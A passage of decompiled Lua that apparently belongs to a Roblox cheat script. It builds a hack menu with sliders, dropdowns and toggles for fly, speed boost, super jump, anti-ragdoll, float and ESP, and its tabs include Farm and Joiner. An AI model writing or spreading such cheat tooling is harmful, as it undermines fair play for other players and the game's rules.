				-- upvalues: (ref) v_u_402_, (ref) v_u_394_, (ref) v_u_388_, (ref) v_u_227_, (ref) v_u_387_, (ref) p_u_383_, (ref) p_u_386_
                _G.PlayerESPColor = v_u_402_
                v_u_394_.BackgroundColor3 = v_u_402_
                if v_u_388_ then
                    v_u_227_:SetValue(v_u_387_, p_u_383_, {
                        ["R"] = math.floor(v_u_402_.R * 255),
                        ["G"] = math.floor(v_u_402_.G * 255),
                        ["B"] = math.floor(v_u_402_.B * 255)
                    })
                end
                if _G.LKZ_ESPCOLOR_EVENT then
                    pcall(function()
						-- upvalues: (ref) v_u_402_
                        _G.LKZ_ESPCOLOR_EVENT:Fire(v_u_402_)
                    end)
                end
                if p_u_386_ then
                    pcall(p_u_386_, v_u_402_)
                end
            end)
        end
        v_u_394_.MouseButton1Click:Connect(function()
			-- upvalues: (ref) v_u_395_
            v_u_395_.Visible = not v_u_395_.Visible
        end)
        if p_u_386_ then
            pcall(p_u_386_, p385_)
        end
        return v390_
    end
    local function v416_(p405_, p406_, p407_, p_u_408_)
		-- upvalues: (ref) v_u_229_
        local v409_ = Instance.new("Frame")
        v409_.Name = p405_ .. "InputOuter"
        v409_.Size = UDim2.new(1, - 10, 0, 40)
        v409_.BackgroundTransparency = 1
        v409_.BorderSizePixel = 0
        v409_.LayoutOrder = # p406_:GetChildren() + 1
        v409_.Parent = p406_
        local v410_ = Instance.new("Frame", v409_)
        v410_.Name = p405_ .. "Input"
        v410_.Size = UDim2.new(1, 0, 1, - 2)
        v410_.Position = UDim2.new(0, 0, 0, 2)
        v410_.BackgroundColor3 = v_u_229_.FRAME_BG
        v410_.BorderSizePixel = 0
        Instance.new("UICorner", v410_).CornerRadius = UDim.new(0, 12)
        local v411_ = Instance.new("UIStroke", v410_)
        v411_.Color = Color3.fromRGB(50, 50, 60)
        v411_.Thickness = 1
        local v412_ = Instance.new("TextLabel", v410_)
        v412_.Size = UDim2.new(0.6, - 20, 1, 0)
        v412_.Position = UDim2.new(0, 15, 0, 0)
        v412_.BackgroundTransparency = 1
        v412_.Text = p405_
        v412_.TextColor3 = v_u_229_.TEXT
        v412_.Font = Enum.Font.Gotham
        v412_.TextSize = 14
        v412_.TextXAlignment = Enum.TextXAlignment.Left
        v412_.Parent = v410_
        local v_u_413_ = Instance.new("TextBox", v410_)
        v_u_413_.Name = "InputBox"
        v_u_413_.Size = UDim2.new(0, 200, 0, 26)
        v_u_413_.Position = UDim2.new(1, - 220, 0.5, - 13)
        v_u_413_.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
        v_u_413_.TextColor3 = v_u_229_.TEXT
        v_u_413_.TextSize = 14
        v_u_413_.Font = Enum.Font.Gotham
        v_u_413_.PlaceholderText = p407_ or ""
        v_u_413_.ClearTextOnFocus = false
        v_u_413_.Text = ""
        Instance.new("UICorner", v_u_413_).CornerRadius = UDim.new(0, 8)
        v_u_413_.Parent = v410_
        v_u_413_.FocusLost:Connect(function(p414_)
			-- upvalues: (ref) p_u_408_, (ref) v_u_413_
            if p414_ and p_u_408_ then
                pcall(p_u_408_, tostring(v_u_413_.Text or ""))
            end
        end)
        return v409_, function()
			-- upvalues: (ref) v_u_413_
            return v_u_413_.Text
        end, function(p415_)
			-- upvalues: (ref) v_u_413_
            v_u_413_.Text = tostring(p415_)
        end
    end
    local function v458_(p_u_417_, p418_, p419_, p420_, p421_, p422_, p_u_423_)
		-- upvalues: (ref) v_u_229_, (ref) v_u_227_, (ref) v_u_203_, (ref) v_u_204_
        local v_u_424_ = p419_:GetAttribute("TabName")
        local v_u_425_ = p419_:GetAttribute("SaveConfigs")
        local v426_ = Instance.new("Frame")
        v426_.Name = p_u_417_ .. "SliderOuter"
        v426_.Size = UDim2.new(1, - 10, 0, 64)
        v426_.BackgroundTransparency = 1
        v426_.BorderSizePixel = 0
        v426_.LayoutOrder = # p419_:GetChildren() + 1
        v426_.Parent = p419_
        local v427_ = Instance.new("Frame", v426_)
        v427_.Name = p_u_417_ .. "Slider"
        v427_.Size = UDim2.new(1, 0, 1, - 4)
        v427_.Position = UDim2.new(0, 0, 0, 2)
        v427_.BackgroundColor3 = v_u_229_.FRAME_BG
        v427_.BorderSizePixel = 0
        Instance.new("UICorner", v427_).CornerRadius = UDim.new(0, 12)
        local v428_ = Instance.new("UIStroke", v427_)
        v428_.Color = Color3.fromRGB(50, 50, 60)
        v428_.Thickness = 1
        local v429_ = Instance.new("TextLabel", v427_)
        v429_.Size = UDim2.new(0.6, - 20, 0, 22)
        v429_.Position = UDim2.new(0, 15, 0, 6)
        v429_.BackgroundTransparency = 1
        v429_.Text = p418_ or p_u_417_
        v429_.TextColor3 = v_u_229_.TEXT
        v429_.Font = Enum.Font.Gotham
        v429_.TextSize = 14
        v429_.TextXAlignment = Enum.TextXAlignment.Left
        local v_u_430_ = Instance.new("TextLabel", v427_)
        v_u_430_.Size = UDim2.new(0.32, - 20, 0, 22)
        v_u_430_.Position = UDim2.new(1, - 20, 0, 6)
        v_u_430_.AnchorPoint = Vector2.new(1, 0)
        v_u_430_.BackgroundTransparency = 1
        v_u_430_.Text = tostring(p422_ or p420_)
        v_u_430_.TextColor3 = v_u_229_.TEXT
        v_u_430_.Font = Enum.Font.GothamBold
        v_u_430_.TextSize = 14
        v_u_430_.TextXAlignment = Enum.TextXAlignment.Right
        v_u_430_.TextYAlignment = Enum.TextYAlignment.Center
        v_u_430_.Parent = v427_
        local v_u_431_ = Instance.new("Frame", v427_)
        v_u_431_.Name = "Bar"
        v_u_431_.Size = UDim2.new(1, - 40, 0, 24)
        v_u_431_.Position = UDim2.new(0, 20, 0, 31)
        v_u_431_.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
        v_u_431_.BorderSizePixel = 0
        Instance.new("UICorner", v_u_431_).CornerRadius = UDim.new(0, 12)
        local v_u_432_ = Instance.new("Frame", v_u_431_)
        v_u_432_.Name = "Fill"
        v_u_432_.Size = UDim2.new(0, 0, 1, 0)
        v_u_432_.Position = UDim2.new(0, 0, 0, 0)
        v_u_432_.BackgroundColor3 = v_u_229_.PRIMARY
        v_u_432_.BorderSizePixel = 0
        Instance.new("UICorner", v_u_432_).CornerRadius = UDim.new(0, 12)
        local v_u_433_ = Instance.new("Frame", v_u_431_)
        v_u_433_.Name = "Handle"
        v_u_433_.Size = UDim2.new(0, 28, 0, 28)
        v_u_433_.Position = UDim2.new(0, - 14, 0.5, - 19)
        v_u_433_.BackgroundColor3 = Color3.fromRGB(230, 230, 230)
        v_u_433_.BorderSizePixel = 0
        Instance.new("UICorner", v_u_433_).CornerRadius = UDim.new(1, 0)
        local v_u_434_ = tonumber(p420_) or 0
        local v_u_435_ = tonumber(p421_) or 100
        local v436_ = v_u_227_
        local v_u_437_ = tonumber(v436_:GetValue(v_u_424_, p_u_417_, p422_)) or v_u_434_
        if v_u_437_ < v_u_434_ then
            v_u_437_ = v_u_434_
        end
        if v_u_435_ < v_u_437_ then
            v_u_437_ = v_u_435_
        end
        local function v_u_443_(p_u_438_)
			-- upvalues: (ref) v_u_435_, (ref) v_u_434_, (ref) v_u_432_, (ref) v_u_431_, (ref) v_u_443_, (ref) v_u_433_, (ref) v_u_430_
            local v439_ = v_u_434_ >= v_u_435_ and 0 or (p_u_438_ - v_u_434_) / (v_u_435_ - v_u_434_)
            local v440_ = math.clamp(v439_, 0, 1)
            v_u_432_.Size = UDim2.new(v440_, 0, 1, 0)
            local v441_ = v_u_431_.AbsoluteSize.X
            if v441_ <= 0 then
                task.spawn(function()
					-- upvalues: (ref) v_u_443_, (ref) p_u_438_
                    task.wait(0.03)
                    pcall(function()
						-- upvalues: (ref) v_u_443_, (ref) p_u_438_
                        v_u_443_(p_u_438_)
                    end)
                end)
            else
                v_u_433_.Position = UDim2.new(0, math.clamp(v440_ * v441_ - v_u_433_.AbsoluteSize.X / 2, - v_u_433_.AbsoluteSize.X / 2, v441_ - v_u_433_.AbsoluteSize.X / 2), 0.5, - v_u_433_.AbsoluteSize.Y / 2)
                local v442_ = math.floor(p_u_438_ * 100) / 100
                v_u_430_.Text = tostring(math.floor(v442_))
            end
        end
        local v_u_444_ = false
        local v_u_445_ = nil
        local function v_u_449_()
			-- upvalues: (ref) v_u_431_, (ref) v_u_203_, (ref) v_u_434_, (ref) v_u_435_, (ref) v_u_437_, (ref) v_u_443_, (ref) p_u_423_, (ref) v_u_425_, (ref) v_u_227_, (ref) v_u_424_, (ref) p_u_417_
            if v_u_431_ and v_u_431_.Parent then
                local v446_ = v_u_431_.AbsolutePosition
                local v447_ = v_u_431_.AbsoluteSize
                local v448_ = v_u_203_:GetMouseLocation().X
                v_u_437_ = v_u_434_ + math.clamp((v448_ - v446_.X) / v447_.X, 0, 1) * (v_u_435_ - v_u_434_)
                v_u_443_(v_u_437_)
                if p_u_423_ then
                    pcall(p_u_423_, v_u_437_)
                end
                if v_u_425_ then
                    v_u_227_:SetValue(v_u_424_, p_u_417_, v_u_437_)
                end
            end
        end
        local function v_u_450_()
			-- upvalues: (ref) v_u_444_, (ref) v_u_445_, (ref) v_u_204_, (ref) v_u_449_
            v_u_444_ = true
            if v_u_445_ then
                v_u_445_:Disconnect()
                v_u_445_ = nil
            end
            v_u_445_ = v_u_204_.RenderStepped:Connect(function()
				-- upvalues: (ref) v_u_449_
                pcall(v_u_449_)
            end)
            v_u_449_()
        end
        local function v_u_451_()
			-- upvalues: (ref) v_u_444_, (ref) v_u_445_
            v_u_444_ = false
            if v_u_445_ then
                v_u_445_:Disconnect()
                v_u_445_ = nil
            end
        end
        v_u_431_.InputBegan:Connect(function(p452_)
			-- upvalues: (ref) v_u_450_
            if p452_.UserInputType == Enum.UserInputType.MouseButton1 or p452_.UserInputType == Enum.UserInputType.Touch then
                v_u_450_()
            end
        end)
        v_u_431_.InputEnded:Connect(function(p453_)
			-- upvalues: (ref) v_u_451_
            if p453_.UserInputType == Enum.UserInputType.MouseButton1 or p453_.UserInputType == Enum.UserInputType.Touch then
                v_u_451_()
            end
        end)
        v_u_433_.InputBegan:Connect(function(p454_)
			-- upvalues: (ref) v_u_450_
            if p454_.UserInputType == Enum.UserInputType.MouseButton1 or p454_.UserInputType == Enum.UserInputType.Touch then
                v_u_450_()
            end
        end)
        v_u_433_.InputEnded:Connect(function(p455_)
			-- upvalues: (ref) v_u_451_
            if p455_.UserInputType == Enum.UserInputType.MouseButton1 or p455_.UserInputType == Enum.UserInputType.Touch then
                v_u_451_()
            end
        end)
        v_u_431_:GetPropertyChangedSignal("AbsoluteSize"):Connect(function()
			-- upvalues: (ref) v_u_443_, (ref) v_u_437_
            pcall(function()
				-- upvalues: (ref) v_u_443_, (ref) v_u_437_
                v_u_443_(v_u_437_)
            end)
        end)
        task.spawn(function()
			-- upvalues: (ref) v_u_443_, (ref) v_u_437_, (ref) p_u_423_
            task.wait(0.01)
            v_u_443_(v_u_437_)
            if p_u_423_ then
                pcall(p_u_423_, v_u_437_)
            end
        end)
        return v426_, function()
			-- upvalues: (ref) v_u_437_
            return v_u_437_
        end, function(p456_)
			-- upvalues: (ref) v_u_437_, (ref) v_u_434_, (ref) v_u_435_, (ref) v_u_443_, (ref) p_u_423_
            local v457_ = tonumber(p456_) or v_u_437_
            if v457_ < v_u_434_ then
                v457_ = v_u_434_
            end
            if v_u_435_ < v457_ then
                v457_ = v_u_435_
            end
            v_u_437_ = v457_
            v_u_443_(v_u_437_)
            if p_u_423_ then
                pcall(p_u_423_, v_u_437_)
            end
        end
    end
    local function v486_(p_u_459_, p460_, p461_, p_u_462_)
		-- upvalues: (ref) v_u_227_, (ref) v_u_229_
        local v_u_463_ = p460_:GetAttribute("TabName")
        local v_u_464_ = p460_:GetAttribute("SaveConfigs")
        local v465_
        if v_u_464_ then
            v465_ = v_u_227_:GetValue(v_u_463_, p_u_459_, p461_[1])
        else
            v465_ = nil
        end
        local v_u_466_ = Instance.new("Frame")
        v_u_466_.Name = p_u_459_ .. "DropdownOuter"
        v_u_466_.Size = UDim2.new(1, - 10, 0, 40)
        v_u_466_.BackgroundTransparency = 1
        v_u_466_.BorderSizePixel = 0
        v_u_466_.LayoutOrder = # p460_:GetChildren() + 1
        v_u_466_.Parent = p460_
        v_u_466_.ClipsDescendants = false
        local v467_ = Instance.new("Frame", v_u_466_)
        v467_.Name = p_u_459_ .. "Inner"
        v467_.Size = UDim2.new(1, 0, 1, - 2)
        v467_.Position = UDim2.new(0, 0, 0, 2)
        v467_.BackgroundColor3 = v_u_229_.FRAME_BG
        v467_.BorderSizePixel = 0
        Instance.new("UICorner", v467_).CornerRadius = UDim.new(0, 12)
        local v468_ = Instance.new("UIStroke", v467_)
        v468_.Color = Color3.fromRGB(50, 50, 60)
        v468_.Thickness = 1
        local v469_ = Instance.new("Frame")
        v469_.Name = "MainDisplay"
        v469_.Size = UDim2.new(1, 0, 0, 40)
        v469_.BackgroundColor3 = v_u_229_.FRAME_BG
        v469_.BorderSizePixel = 0
        v469_.Parent = v467_
        v469_.ZIndex = 2
        Instance.new("UICorner", v469_).CornerRadius = UDim.new(0, 12)
        local v470_ = Instance.new("UIStroke", v469_)
        v470_.Color = Color3.fromRGB(50, 50, 60)
        v470_.Thickness = 1
        local v471_ = Instance.new("TextButton")
        v471_.Size = UDim2.new(1, 0, 1, 0)
        v471_.BackgroundTransparency = 1
        v471_.Text = ""
        v471_.ZIndex = 3
        v471_.Parent = v469_
        local v_u_472_ = Instance.new("TextLabel")
        v_u_472_.Size = UDim2.new(1, - 30, 1, 0)
        v_u_472_.Position = UDim2.new(0, 10, 0, 0)
        v_u_472_.BackgroundTransparency = 1
        v_u_472_.Text = v465_ or (p461_[1] or p_u_459_)
        v_u_472_.TextColor3 = v_u_229_.TEXT
        v_u_472_.Font = Enum.Font.Gotham
        v_u_472_.TextSize = 14
        v_u_472_.TextXAlignment = Enum.TextXAlignment.Left
        v_u_472_.Parent = v469_
        local v_u_473_ = Instance.new("TextLabel")
        v_u_473_.Size = UDim2.new(0, 20, 1, 0)
        v_u_473_.Position = UDim2.new(1, - 25, 0, 0)
        v_u_473_.BackgroundTransparency = 1
        v_u_473_.Text = "\226\150\188"
        v_u_473_.TextColor3 = v_u_229_.TEXT_DIM
        v_u_473_.Font = Enum.Font.SourceSans
        v_u_473_.TextSize = 16
        v_u_473_.TextXAlignment = Enum.TextXAlignment.Center
        v_u_473_.Parent = v469_
        local v_u_474_ = Instance.new("Frame")
        v_u_474_.Name = "OptionsFrame"
        v_u_474_.Size = UDim2.new(1, 0, 0, 0)
        v_u_474_.Position = UDim2.new(0, 0, 0, 45)
        v_u_474_.BackgroundColor3 = v_u_229_.FRAME_BG
        v_u_474_.BorderSizePixel = 0
        v_u_474_.Visible = false
        v_u_474_.ZIndex = 1
        v_u_474_.Parent = v_u_466_
        Instance.new("UICorner", v_u_474_).CornerRadius = UDim.new(0, 12)
        local v475_ = Instance.new("UIStroke", v_u_474_)
        v475_.Color = Color3.fromRGB(50, 50, 60)
        v475_.Thickness = 1
        local v476_ = Instance.new("UIListLayout", v_u_474_)
        v476_.Padding = UDim.new(0, 4)
        v476_.SortOrder = Enum.SortOrder.LayoutOrder
        local v477_, v478_, v479_ = ipairs(p461_)
        local v480_ = 0
        local v481_ = 30
        while true do
            local v_u_482_
            v479_, v_u_482_ = v477_(v478_, v479_)
            if v479_ == nil then
                break
            end
            local v_u_483_ = Instance.new("TextButton")
            v_u_483_.Name = "Option_" .. tostring(v479_)
            v_u_483_.Size = UDim2.new(1, - 10, 0, v481_)
            v_u_483_.Position = UDim2.new(0, 5, 0, 0)
            v_u_483_.BackgroundTransparency = 1
            v_u_483_.Text = v_u_482_
            v_u_483_.TextColor3 = v_u_229_.TEXT_DIM
            v_u_483_.Font = Enum.Font.Gotham
            v_u_483_.TextSize = 13
            v_u_483_.LayoutOrder = v479_
            v_u_483_.Parent = v_u_474_
            v_u_483_.MouseButton1Click:Connect(function()
				-- upvalues: (ref) v_u_472_, (ref) v_u_482_, (ref) v_u_464_, (ref) v_u_227_, (ref) v_u_463_, (ref) p_u_459_, (ref) p_u_462_, (ref) v_u_474_, (ref) v_u_466_, (ref) v_u_473_
                v_u_472_.Text = v_u_482_
                if v_u_464_ then
                    v_u_227_:SetValue(v_u_463_, p_u_459_, v_u_482_)
                end
                if p_u_462_ then
                    pcall(p_u_462_, v_u_482_)
                end
                v_u_474_.Visible = false
                v_u_474_.Size = UDim2.new(1, 0, 0, 0)
                v_u_466_.Size = UDim2.new(1, - 10, 0, 40)
                v_u_473_.Text = "\226\150\188"
            end)
            v_u_483_.MouseEnter:Connect(function()
				-- upvalues: (ref) v_u_483_, (ref) v_u_229_
                v_u_483_.TextColor3 = v_u_229_.TEXT
            end)
            v_u_483_.MouseLeave:Connect(function()
				-- upvalues: (ref) v_u_483_, (ref) v_u_229_
                v_u_483_.TextColor3 = v_u_229_.TEXT_DIM
            end)
            v480_ = v480_ + v481_ + v476_.Padding.Offset
        end
        local v_u_484_ = v480_ + 8
        local v_u_485_ = false
        v471_.MouseButton1Click:Connect(function()
			-- upvalues: (ref) v_u_485_, (ref) v_u_474_, (ref) v_u_484_, (ref) v_u_466_, (ref) v_u_473_
            v_u_485_ = not v_u_485_
            if v_u_485_ then
                v_u_474_.Visible = true
                v_u_474_.Size = UDim2.new(1, 0, 0, v_u_484_)
                v_u_466_.Size = UDim2.new(1, - 10, 0, 40 + v_u_484_ + 5)
                v_u_473_.Text = "\226\150\178"
            else
                v_u_474_.Visible = false
                v_u_474_.Size = UDim2.new(1, 0, 0, 0)
                v_u_466_.Size = UDim2.new(1, - 10, 0, 40)
                v_u_473_.Text = "\226\150\188"
            end
        end)
        if p_u_462_ and (v465_ or p461_[1]) then
            pcall(p_u_462_, v465_ or p461_[1])
        end
        return v_u_466_
    end
    local v487_ = v314_("Helper", true)
    local v488_ = v314_("Movement", true)
    local v489_ = v314_("Misc", true)
    local v490_ = v314_("ESP", true)
    local v491_ = v314_("Server", true)
    local v492_
    if v_u_6_ or v_u_7_ then
        v492_ = v314_("Joiner", false)
    else
        v492_ = nil
    end
    local v493_ = v314_("Farm", false)
    v_u_257_ = v314_("Config", false)
    task.wait()
    v290_()
    v337_("Fly", v488_, function(p494_)
        _G.Fly = p494_
    end)
    v458_("Flyspeed", "Fly Speed", v488_, 10, 170, _G.FlySpeed, function(p495_)
        _G.FlySpeed = p495_
    end)
    v337_("Anti Ragdoll", v488_, function(p496_)
        _G.AntiRag = p496_
    end)
    v337_("Super Jump", v488_, function(p497_)
        _G.superJump = p497_
    end)
    v337_("Speed Boost", v488_, function(p498_)
        _G.additionalSpeed = p498_
    end)
    v337_("Upstairs", v487_, function(p499_)
		-- upvalues: (ref) v_u_12_
        if p499_ then
            local v500_ = game.Players.LocalPlayer:WaitForChild("PlayerGui")
            local v501_ = v500_:FindFirstChild("ScreenGui")
            if v501_ then
                v501_ = v500_.ScreenGui:FindFirstChildOfClass("Frame")
            end
            local v502_ = Instance.new("ScreenGui", v500_)
            v502_.Name = "UpstairsToggleGUI"
            v502_.ResetOnSpawn = false
            local v503_ = Instance.new("Frame", v502_)
            v503_.Size = UDim2.new(0, 220, 0, 40)
            if v501_ then
                v503_.Position = UDim2.new(v501_.Position.X.Scale, v501_.Position.X.Offset, v501_.Position.Y.Scale, v501_.Position.Y.Offset + v501_.Size.Y.Offset + 10)
            else
                v503_.Position = UDim2.new(1, - 230, 0, 20)
            end
            v503_.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
            v503_.BorderSizePixel = 0
            v503_.Active = true
            v503_.Draggable = true
            Instance.new("UICorner", v503_).CornerRadius = UDim.new(0, 20)
            local v504_ = Instance.new("UIStroke", v503_)
            v504_.Color = Color3.fromRGB(0, 255, 255)
            v504_.Thickness = 2
            v504_.Transparency = 0
            local v505_ = Instance.new("TextLabel", v503_)
            v505_.Size = UDim2.new(0, 150, 1, 0)
            v505_.Position = UDim2.new(0, 10, 0, 0)
            v505_.BackgroundTransparency = 1
            v505_.Text = "Upstairs"
            v505_.TextColor3 = Color3.fromRGB(255, 255, 255)
            v505_.TextScaled = false
            v505_.TextSize = 16.5
            v505_.Font = Enum.Font.Gotham
            local v_u_506_ = Instance.new("Frame", v503_)
            v_u_506_.Size = UDim2.new(0, 50, 0, 25)
            v_u_506_.Position = UDim2.new(1, - 60, 0.5, - 12)
            v_u_506_.BackgroundColor3 = Color3.fromRGB(80, 80, 120)
            v_u_506_.BorderSizePixel = 0
            Instance.new("UICorner", v_u_506_).CornerRadius = UDim.new(0, 12)
            local v_u_507_ = Instance.new("Frame", v_u_506_)
            v_u_507_.Size = UDim2.new(0, 20, 0, 20)
            v_u_507_.Position = UDim2.new(0, 2, 0.5, - 10)
            v_u_507_.BackgroundColor3 = Color3.fromRGB(200, 200, 255)
            v_u_507_.BorderSizePixel = 0
            Instance.new("UICorner", v_u_507_).CornerRadius = UDim.new(1, 0)
            local v508_ = Instance.new("TextButton", v_u_506_)
            v508_.Size = UDim2.new(1, 0, 1, 0)
            v508_.Position = UDim2.new(0, 0, 0, 2)
            v508_.BackgroundTransparency = 1
            v508_.Text = ""
            v508_.AutoButtonColor = false
            local v_u_509_ = false
            _G.upstairs = v_u_509_
            local function v_u_510_()
				-- upvalues: (ref) v_u_509_, (ref) v_u_507_, (ref) v_u_506_
                if v_u_509_ then
                    v_u_507_:TweenPosition(UDim2.new(0.55, 0, 0.5, - 10), "Out", "Sine", 0.2, true)
                    v_u_506_.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
                else
                    v_u_507_:TweenPosition(UDim2.new(0, 2, 0.5, - 10), "Out", "Sine", 0.2, true)
                    v_u_506_.BackgroundColor3 = Color3.fromRGB(80, 80, 120)
                end
            end
            v_u_510_()
            v508_.MouseButton1Click:Connect(function()
				-- upvalues: (ref) v_u_509_, (ref) v_u_510_
                v_u_509_ = not v_u_509_
                _G.upstairs = v_u_509_
                v_u_510_()
            end)
        else
            local v511_, v512_, v513_ = ipairs(v_u_12_.PlayerGui:GetChildren())
            while true do
                local v514_
                v513_, v514_ = v511_(v512_, v513_)
                if v513_ == nil then
                    break
                end
                if v514_.Name == "UpstairsToggleGUI" then
                    v514_:Destroy()
                end
            end
            _G.upstairs = false
        end
    end)
    v337_("Float V2", v487_, function(p515_)
		-- upvalues: (ref) v_u_12_
        buy("Boogie Bomb")
        if p515_ then
            local v516_ = game.Players.LocalPlayer:WaitForChild("PlayerGui")
            local v517_ = v516_:FindFirstChild("ScreenGui")
            if v517_ then
                v517_ = v516_.ScreenGui:FindFirstChildOfClass("Frame")
            end
            local v518_ = Instance.new("ScreenGui", v516_)
            v518_.Name = "FloatV2ToggleGUI"
            v518_.ResetOnSpawn = false
            local v519_ = Instance.new("Frame", v518_)
            v519_.Size = UDim2.new(0, 220, 0, 40)
            if v517_ then
                v519_.Position = UDim2.new(v517_.Position.X.Scale, v517_.Position.X.Offset, v517_.Position.Y.Scale, v517_.Position.Y.Offset + v517_.Size.Y.Offset + 10)
            else
                v519_.Position = UDim2.new(1, - 230, 0, 70)
            end
            v519_.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
            v519_.BorderSizePixel = 0
            v519_.Active = true
            v519_.Draggable = true
            Instance.new("UICorner", v519_).CornerRadius = UDim.new(0, 20)
            local v520_ = Instance.new("UIStroke", v519_)
            v520_.Color = Color3.fromRGB(0, 255, 255)
            v520_.Thickness = 2
            v520_.Transparency = 0
            local v521_ = Instance.new("TextLabel", v519_)
            v521_.Size = UDim2.new(0, 150, 1, 0)
            v521_.Position = UDim2.new(0, 10, 0, 0)
            v521_.BackgroundTransparency = 1
            v521_.Text = "Float V2"
            v521_.TextColor3 = Color3.fromRGB(255, 255, 255)
            v521_.TextScaled = false
            v521_.TextSize = 16.5
            v521_.Font = Enum.Font.Gotham
            local v_u_522_ = Instance.new("Frame", v519_)
            v_u_522_.Size = UDim2.new(0, 50, 0, 25)
            v_u_522_.Position = UDim2.new(1, - 60, 0.5, - 12)
            v_u_522_.BackgroundColor3 = Color3.fromRGB(80, 80, 120)
            v_u_522_.BorderSizePixel = 0
            Instance.new("UICorner", v_u_522_).CornerRadius = UDim.new(0, 12)
            local v_u_523_ = Instance.new("Frame", v_u_522_)
            v_u_523_.Size = UDim2.new(0, 20, 0, 20)
            v_u_523_.Position = UDim2.new(0, 2, 0.5, - 10)
            v_u_523_.BackgroundColor3 = Color3.fromRGB(200, 200, 255)
            v_u_523_.BorderSizePixel = 0
            Instance.new("UICorner", v_u_523_).CornerRadius = UDim.new(1, 0)
            local v524_ = Instance.new("TextButton", v_u_522_)
            v524_.Size = UDim2.new(1, 0, 1, 0)
            v524_.Position = UDim2.new(0, 0, 0, 2)
            v524_.BackgroundTransparency = 1
            v524_.Text = ""
            v524_.AutoButtonColor = false
            local v_u_525_ = false
            _G.FloatV2 = v_u_525_
            local function v_u_526_()
				-- upvalues: (ref) v_u_525_, (ref) v_u_523_, (ref) v_u_522_
                if v_u_525_ then
                    v_u_523_:TweenPosition(UDim2.new(0.55, 0, 0.5, - 10), "Out", "Sine", 0.2, true)
                    v_u_522_.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
                else
                    v_u_523_:TweenPosition(UDim2.new(0, 2, 0.5, - 10), "Out", "Sine", 0.2, true)
                    v_u_522_.BackgroundColor3 = Color3.fromRGB(80, 80, 120)
                end
            end
            v_u_526_()
            v524_.MouseButton1Click:Connect(function()
				-- upvalues: (ref) v_u_525_, (ref) v_u_526_
                v_u_525_ = not v_u_525_
                _G.FloatV2 = v_u_525_
                v_u_526_()
            end)
        else
            local v527_, v528_, v529_ = ipairs(v_u_12_.PlayerGui:GetChildren())
            while true do
                local v530_
                v529_, v530_ = v527_(v528_, v529_)
                if v529_ == nil then
                    break
                end
                if v530_.Name == "FloatV2ToggleGUI" then
                    v530_:Destroy()
                end
            end
            _G.FloatV2 = false
        end
    end)
    v337_("Float V1", v487_, function(p531_)
		-- upvalues: (ref) v_u_12_
        if p531_ then
            local v532_ = game.Players.LocalPlayer:WaitForChild("PlayerGui")
            local v533_ = v532_:FindFirstChild("ScreenGui")
            if v533_ then
                v533_ = v532_.ScreenGui:FindFirstChildOfClass("Frame")
            end
            local v534_ = Instance.new("ScreenGui", v532_)
            v534_.Name = "FloatV1ToggleGUI"
            v534_.ResetOnSpawn = false
            local v535_ = Instance.new("Frame", v534_)
            v535_.Size = UDim2.new(0, 220, 0, 40)
            if v533_ then
                v535_.Position = UDim2.new(v533_.Position.X.Scale, v533_.Position.X.Offset, v533_.Position.Y.Scale, v533_.Position.Y.Offset + v533_.Size.Y.Offset + 10)
            else
                v535_.Position = UDim2.new(1, - 230, 0, 120)
            end
            v535_.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
            v535_.BorderSizePixel = 0
            v535_.Active = true
            v535_.Draggable = true
            Instance.new("UICorner", v535_).CornerRadius = UDim.new(0, 20)
            local v536_ = Instance.new("UIStroke", v535_)
            v536_.Color = Color3.fromRGB(0, 255, 255)
            v536_.Thickness = 2
            v536_.Transparency = 0
            local v537_ = Instance.new("TextLabel", v535_)
            v537_.Size = UDim2.new(0, 150, 1, 0)
            v537_.Position = UDim2.new(0, 10, 0, 0)
            v537_.BackgroundTransparency = 1
            v537_.Text = "Float V1"
            v537_.TextColor3 = Color3.fromRGB(255, 255, 255)
            v537_.TextScaled = false
            v537_.TextSize = 16.5
            v537_.Font = Enum.Font.Gotham
            local v_u_538_ = Instance.new("Frame", v535_)
            v_u_538_.Size = UDim2.new(0, 50, 0, 25)
            v_u_538_.Position = UDim2.new(1, - 60, 0.5, - 12)
            v_u_538_.BackgroundColor3 = Color3.fromRGB(80, 80, 120)
            v_u_538_.BorderSizePixel = 0
            Instance.new("UICorner", v_u_538_).CornerRadius = UDim.new(0, 12)
            local v_u_539_ = Instance.new("Frame", v_u_538_)
            v_u_539_.Size = UDim2.new(0, 20, 0, 20)
            v_u_539_.Position = UDim2.new(0, 2, 0.5, - 10)
            v_u_539_.BackgroundColor3 = Color3.fromRGB(200, 200, 255)
            v_u_539_.BorderSizePixel = 0
            Instance.new("UICorner", v_u_539_).CornerRadius = UDim.new(1, 0)
            local v540_ = Instance.new("TextButton", v_u_538_)
            v540_.Size = UDim2.new(1, 0, 1, 0)
            v540_.Position = UDim2.new(0, 0, 0, 2)
            v540_.BackgroundTransparency = 1
            v540_.Text = ""
            v540_.AutoButtonColor = false
            local v_u_541_ = false
            _G.FloatV1 = v_u_541_
            local function v_u_542_()
				-- upvalues: (ref) v_u_541_, (ref) v_u_539_, (ref) v_u_538_
                if v_u_541_ then
                    v_u_539_:TweenPosition(UDim2.new(0.55, 0, 0.5, - 10), "Out", "Sine", 0.2, true)
                    v_u_538_.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
                else
                    v_u_539_:TweenPosition(UDim2.new(0, 2, 0.5, - 10), "Out", "Sine", 0.2, true)
                    v_u_538_.BackgroundColor3 = Color3.fromRGB(80, 80, 120)
                end
            end
            v_u_542_()
            v540_.MouseButton1Click:Connect(function()
				-- upvalues: (ref) v_u_541_, (ref) v_u_542_
                v_u_541_ = not v_u_541_
                _G.FloatV1 = v_u_541_
                v_u_542_()
            end)
        else
            local v543_, v544_, v545_ = ipairs(v_u_12_.PlayerGui:GetChildren())
            while true do
                local v546_
                v545_, v546_ = v543_(v544_, v545_)
                if v545_ == nil then
                    break
                end
                if v546_.Name == "FloatV1ToggleGUI" then
                    v546_:Destroy()
                end
            end
            _G.FloatV1 = false
        end
    end)
    v337_("Fly To Base", v487_, function(p547_)
        local v_u_548_ = game:GetService("Players").LocalPlayer
        local v_u_549_ = nil
        local v_u_550_ = false
        local v_u_551_ = game:GetService("RunService")
        local function v_u_556_()
			-- upvalues: (ref) v_u_548_
            local v552_ = v_u_548_.Character
